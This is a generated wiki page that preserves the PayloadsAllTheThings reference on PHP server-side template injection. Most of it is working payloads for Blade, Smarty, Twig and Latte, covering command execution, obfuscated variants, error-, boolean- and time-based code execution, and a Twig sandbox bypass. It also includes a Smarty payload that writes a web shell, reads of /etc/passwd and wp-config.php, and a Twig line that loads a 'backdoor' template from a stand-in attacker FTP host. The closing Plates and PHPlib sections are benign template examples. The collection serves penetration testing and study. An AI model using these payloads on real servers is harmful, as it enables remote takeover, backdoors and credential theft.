---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Server Side Template Injection - PHP

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-server-side-template-injection-php` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/PHP.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Server Side Template Injection - PHP](../../topics/server-side-template-injection/server-side-template-injection-php.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-server-side-template-injection-php |
| name | Server Side Template Injection - PHP |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md |

## Preserved Source Material

````yaml
_body: "# Server Side Template Injection - PHP\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that occurs\
  \ when an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary\
  \ commands on the server. In PHP, SSTI can arise when user input is embedded within templates rendered by templating engines\
  \ like Smarty, Twig, or even within plain PHP templates, without proper sanitization or validation.\n\n## Summary\n\n- [Templating\
  \ Libraries](#templating-libraries)\n- [Universal Payloads](#universal-payloads)\n- [Blade](#blade)\n- [Smarty](#smarty)\n\
  \    - [Smarty - Code Execution with Obfuscation](#smarty---code-execution-with-obfuscation)\n- [Twig](#twig)\n    - [Twig\
  \ - Basic Injection](#twig---basic-injection)\n    - [Twig - Template Format](#twig---template-format)\n    - [Twig - Arbitrary\
  \ File Reading](#twig---arbitrary-file-reading)\n    - [Twig - Code Execution](#twig---code-execution)\n    - [Twig - Code\
  \ Execution with Obfuscation](#twig---code-execution-with-obfuscation)\n- [Latte](#latte)\n    - [Latte - Basic Injection](#latte---basic-injection)\n\
  \    - [Latte - Code Execution](#latte---code-execution)\n- [patTemplate](#pattemplate)\n- [PHPlib](#phplib-and-html_template_phplib)\n\
  - [Plates](#plates)\n- [References](#references)\n\n## Templating Libraries\n\n| Template Name   | Payload Format |\n|-----------------|----------------|\n\
  | Blade (Laravel) | `{{ }}`        |\n| Latte           | `{ }`          |\n| Mustache        | `{{ }}`        |\n| Plates\
  \          | `<?= ?>`       |\n| Smarty          | `{ }`          |\n| Twig            | `{{ }}`        |\n\n## Universal\
  \ Payloads\n\nGeneric code injection payloads work for many PHP-based template engines, such as Blade, Latte and Smarty.\n\
  \nTo use these payloads, wrap them in the appropriate tag.\n\n```php\n// Rendered RCE\nshell_exec('id')\nsystem('id')\n\n\
  // Error-Based RCE\nini_set(\"error_reporting\", \"1\") // Enable verbose fatal errors for Error-Based\ncall_user_func(join(\"\
  \", [\"xx\", shell_exec('id')]))\n\n// Boolean-Based RCE\n1 / (pclose(popen(\"id\", \"wb\")) == 0)\n\n// Time-Based RCE\n\
  shell_exec('id && sleep 5')\nsystem('id && sleep 5')\n```\n\n## Blade\n\n> Universal payloads also work for Blade.\n\n[Official\
  \ website](https://laravel.com/docs/master/blade)\n> Blade is the simple, yet powerful templating engine that is included\
  \ with Laravel.\n\nThe string `id` is generated with `{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}`.\n\
  \n```php\n{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}\n```\n\nReference and explanation of\
  \ payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).\n\
  \n---\n\n## Smarty\n\n> Universal payloads also work for Smarty before v5.\n\n[Official website](https://www.smarty.net/docs/en/)\n\
  > Smarty is a template engine for PHP.\n\n```php\n{$smarty.version}\n{php}echo `id`;{/php} //deprecated in smarty v3\n{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"\
  <?php passthru($_GET['cmd']); ?>\",self::clearConfig())}\n{system('ls')} // compatible v3, deprecated in v5\n{system('cat\
  \ index.php')} // compatible v3, deprecated in v5\n```\n\n### Smarty - Code Execution with Obfuscation\n\nBy employing the\
  \ variable modifier `cat`, individual characters are concatenated to form the string \"id\" as follows: `{chr(105)|cat:chr(100)}`.\n\
  \nExecute system comman (command: `id`):\n\n```php\n{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}\n\
  ```\n\nReference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).\n\
  \n---\n\n## Twig\n\n[Official website](https://twig.symfony.com/)\n> Twig is a modern template engine for PHP.\n\n### Twig\
  \ - Basic Injection\n\n```php\n{{7*7}}\n{{7*'7'}} would result in 49\n{{dump(app)}}\n{{dump(_context)}}\n{{app.request.server.all|join(',')}}\n\
  ```\n\n### Twig - Template Format\n\n```php\n$output = $twig > render (\n  'Dear' . $_GET['custom_greeting'],\n  array(\"\
  first_name\" => $user.first_name)\n);\n\n$output = $twig > render (\n  \"Dear {first_name}\",\n  array(\"first_name\" =>\
  \ $user.first_name)\n);\n```\n\n### Twig - Arbitrary File Reading\n\n```php\n\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@\n\
  {{include(\"wp-config.php\")}}\n```\n\n### Twig - Code Execution\n\n```php\n{{self}}\n{{_self.env.setCache(\"ftp://attacker.net:2121\"\
  )}}{{_self.env.loadTemplate(\"backdoor\")}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"\
  id\")}}\n{{['id']|filter('system')}}\n{{[0]|reduce('system','id')}}\n{{['id']|map('system')|join}}\n{{['id',1]|sort('system')|join}}\n\
  {{['cat\\x20/etc/passwd']|filter('system')}}\n{{['cat$IFS/etc/passwd']|filter('system')}}\n{{['id']|filter('passthru')}}\n\
  {{['id']|map('passthru')}}\n{{['nslookup oastify.com']|filter('system')}}\n\n{% for a in [\"error_reporting\", \"1\"]|sort(\"\
  ini_set\") %}{% endfor %} // Enable verbose error output for Error-Based\n{{_self.env.registerUndefinedFilterCallback(\"\
  shell_exec\")}}{%include [\"Y:/A:/\", _self.env.getFilter(\"id\")]|join%} // Error-Based RCE <= 1.19\n{{[0]|map([\"xx\"\
  , {\"id\": \"shell_exec\"}|map(\"call_user_func\")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0\n\n{{_self.env.registerUndefinedFilterCallback(\"\
  shell_exec\")}}{{1/(_self.env.getFilter(\"id && echo UniqueString\")|trim('\\n') ends with \"UniqueString\")}} // Boolean-Based\
  \ RCE <= 1.19\n{{1/({\"id && echo UniqueString\":\"shell_exec\"}|map(\"call_user_func\")|join|trim('\\n') ends with \"UniqueString\"\
  )}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0\n\n{% set a = [\"error_reporting\", \"1\"]|sort(\"ini_set\") %}{% set b =\
  \ [\"ob_start\", \"call_user_func\"]|sort(\"call_user_func\") %}{{ [\"id\", 0]|sort(\"system\") }}{% set a = [\"ob_end_flush\"\
  , []]|sort(\"call_user_func_array\")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614\n{{ 1 / ([\"id >>/dev/null\
  \ && echo -n 1\", \"0\"]|sort(\"system\")|first == \"0\") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614\n\
  ```\n\nWith certain settings, Twig interrupts rendering, if any errors or warnings are raised. This payload works fine in\
  \ these cases:\n\n```php\n{{ {'id':'shell_exec'}|map('call_user_func')|join }}\n```\n\nExample injecting values to avoid\
  \ using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)\n\n```python\nFILENAME{% set\
  \ var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}\n```\n\nExample with an email passing FILTER_VALIDATE_EMAIL\
  \ PHP.\n\n```powershell\nPOST /subscribe?0=cat+/etc/passwd HTTP/1.1\nemail=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"\
  @attacker.tld\n```\n\n### Twig - Code Execution with Obfuscation\n\nTwig's block feature and built-in `_charset` variable\
  \ can be nesting can be used to produced the payload (command: `id`)\n\n```twig\n{%block U%}id000passthru{%endblock%}{%set\
  \ x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}\n```\n\nThe following payload, which harnesses the\
  \ built-in `_context` variable, also achieves RCE – provided that the template engine performs a double-rendering process:\n\
  \n```twig\n{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}\n```\n\nReference and explanation\
  \ of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).\n\
  \n---\n\n## Latte\n\n> Universal payloads also work for Latte.\n\n### Latte - Basic Injection\n\n```php\n{var $X=\"POC\"\
  }{$X}\n```\n\n### Latte - Code Execution\n\n```php\n{php system('nslookup oastify.com')}\n```\n\n---\n\n## patTemplate\n\
  \n> [patTemplate](https://github.com/wernerwa/pat-template) non-compiling PHP templating engine, that uses XML tags to divide\
  \ a document into different parts\n\n```xml\n<patTemplate:tmpl name=\"page\">\n  This is the main page.\n  <patTemplate:tmpl\
  \ name=\"foo\">\n    It contains another template.\n  </patTemplate:tmpl>\n  <patTemplate:tmpl name=\"hello\">\n    Hello\
  \ {NAME}.<br/>\n  </patTemplate:tmpl>\n</patTemplate:tmpl>\n```\n\n---\n\n## PHPlib and HTML_Template_PHPLIB\n\n[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB)\
  \ is the same as PHPlib but ported to Pear.\n\n`authors.tpl`\n\n```html\n<html>\n <head><title>{PAGE_TITLE}</title></head>\n\
  \ <body>\n  <table>\n   <caption>Authors</caption>\n   <thead>\n    <tr><th>Name</th><th>Email</th></tr>\n   </thead>\n\
  \   <tfoot>\n    <tr><td colspan=\"2\">{NUM_AUTHORS}</td></tr>\n   </tfoot>\n   <tbody>\n<!-- BEGIN authorline -->\n   \
  \ <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>\n<!-- END authorline -->\n   </tbody>\n  </table>\n </body>\n</html>\n\
  ```\n\n`authors.php`\n\n```php\n<?php\n//we want to display this author list\n$authors = array(\n    'Christian Weiske'\
  \  => 'cweiske@php.net',\n    'Bjoern Schotte'     => 'schotte@mayflower.de'\n);\n\nrequire_once 'HTML/Template/PHPLIB.php';\n\
  //create template object\n$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');\n//load file\n$t->setFile('authors',\
  \ 'authors.tpl');\n//set block\n$t->setBlock('authors', 'authorline', 'authorline_ref');\n\n//set some variables\n$t->setVar('NUM_AUTHORS',\
  \ count($authors));\n$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));\n\n//display the authors\nforeach\
  \ ($authors as $name => $email) {\n    $t->setVar('AUTHOR_NAME', $name);\n    $t->setVar('AUTHOR_EMAIL', $email);\n    $t->parse('authorline_ref',\
  \ 'authorline', true);\n}\n\n//finish and echo\necho $t->finish($t->parse('OUT', 'authors'));\n?>\n```\n\n---\n\n## Plates\n\
  \nPlates is inspired by Twig but a native PHP template engine instead of a compiled template engine.\n\ncontroller:\n\n\
  ```php\n// Create new Plates instance\n$templates = new League\\Plates\\Engine('/path/to/templates');\n\n// Render a template\n\
  echo $templates->render('profile', ['name' => 'Jonathan']);\n```\n\npage template:\n\n```php\n<?php $this->layout('template',\
  \ ['title' => 'User Profile']) ?>\n\n<h1>User Profile</h1>\n<p>Hello, <?=$this->e($name)?></p>\n```\n\nlayout template:\n\
  \n```php\n<html>\n  <head>\n    <title><?=$this->e($title)?></title>\n  </head>\n  <body>\n    <?=$this->section('content')?>\n\
  \  </body>\n</html>\n```\n\n## References\n\n- [Limitations are just an illusion – advanced server-side template exploitation\
  \ with RCE everywhere - Brumens - March 24, 2025](https://web.archive.org/web/20240906203847/https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)\n\
  - [Server Side Template Injection (SSTI) via Twig escape handler - Grav - March 21, 2024](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)\n\
  - [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)"
_relative_path: Server Side Template Injection/PHP.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/PHP.md
````
